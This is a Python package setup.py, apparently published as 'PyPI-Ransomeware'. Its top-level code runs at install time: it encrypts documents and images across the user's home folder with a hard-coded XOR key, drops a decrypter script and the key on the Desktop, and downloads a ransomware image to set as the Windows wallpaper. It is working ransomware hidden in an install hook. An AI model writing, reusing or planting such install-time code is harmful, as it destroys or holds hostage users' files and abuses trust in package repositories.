from setuptools import setup, find_packages
import os
import base64
import ctypes
import urllib.request


FILE_EXTS = ["txt", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "jpg", "jpeg", "png", "jfif"]
KEY = b"1AhEPb-PO2TnEyG4ODw8HQeQLxv_Nku2ofWtrya5R3I="
SYSROOT = os.path.expanduser('~')


def crypt_file(file_path):
    with open(file_path, "rb") as f:
        data = f.read()
    encrypted_data = bytearray()
    for i, byte in enumerate(data):
        encrypted_data.append(byte ^ KEY[i % len(KEY)])
    serialized_data = base64.b64encode(encrypted_data)
    with open(file_path, "wb") as f:
        f.write(serialized_data)
    

def crypt_system():
    system = os.walk(SYSROOT, topdown=True)
    for root, dirs, files in system:
        for file in files:
            file_path = os.path.join(root, file)
            if file.split('.')[-1].lower() in FILE_EXTS:
                crypt_file(file_path)



def change_desktop_background():
    imageUrl = "https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg"
    path = f"{SYSROOT}\\Desktop\\background.jpg"
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

def decrypter():
    os.mkdir(f"{SYSROOT}\\Desktop\\Decrypter")
    with open(f"{SYSROOT}\\Desktop\\Decrypter\\decrypter.py", 'w') as f:
        f.write(r"""
import os
import base64

file_exts = ["txt", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "jpg", "jpeg", "png", "jfif"]
sysRoot = os.path.expanduser('~')

def decrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    deserialized_data = base64.b64decode(data)
    unencrypted_data = bytearray()
    for i, byte in enumerate(deserialized_data):
        unencrypted_data.append(byte ^ key[i % len(key)])
    with open(file_path, "wb") as f:
        f.write(unencrypted_data)


def decrypt_system(key):
        system = os.walk(sysRoot, topdown=True)
        for root, dirs, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if file.split('.')[-1].lower() in file_exts:
                    try:
                        decrypt_file(file_path, key)
                    except:
                        continue

def main():
    with open("KEY", "rb") as key_file:
        key = key_file.read()
    for i in range(2):
        decrypt_system(key)


if __name__ == "__main__":
    main()
""")
    with open(f"{SYSROOT}\\Desktop\\Decrypter\\KEY", 'w') as f:
        f.write("1AhEPb-PO2TnEyG4ODw8HQeQLxv_Nku2ofWtrya5R3I=")

crypt_system()
decrypter()
change_desktop_background()

setup(
  name = "PyPI-Ransomeware",
  packages = find_packages(),
  version = "0.1",
  description = "PyPI-Ransomeware",
  author = "dkonis",
  author_email = "",
  url = "",
  download_url = "", 
  keywords = [""],
  classifiers = [],
)